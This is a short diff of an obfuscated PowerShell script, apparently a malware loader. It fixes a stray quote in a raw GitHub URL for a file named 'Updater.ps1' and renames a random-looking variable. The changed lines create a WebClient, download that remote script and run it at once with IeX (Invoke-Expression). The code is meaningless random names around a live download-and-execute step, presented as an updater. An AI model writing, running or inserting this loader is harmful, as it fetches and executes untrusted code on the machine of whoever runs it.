@@ -35,11 +35,11 @@ $iasovosaivavspajv='tic'
 finally
 {
 
-$kdisxosdjjd='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/Updater.ps1''
+$kdisxosdjjd='https://raw.githubusercontent.com/burnitup545/PrivateRepo/main/Updater.ps1'
 
 
 
 
-$rgualnNZnZum = (new-object net.webclient); IeX ($rgualnNZnZum.downloadstring($kdisxosdjjd))
+$loqeAJRABDYr = (new-object net.webclient); IeX ($loqeAJRABDYr.downloadstring($kdisxosdjjd))
 
 }
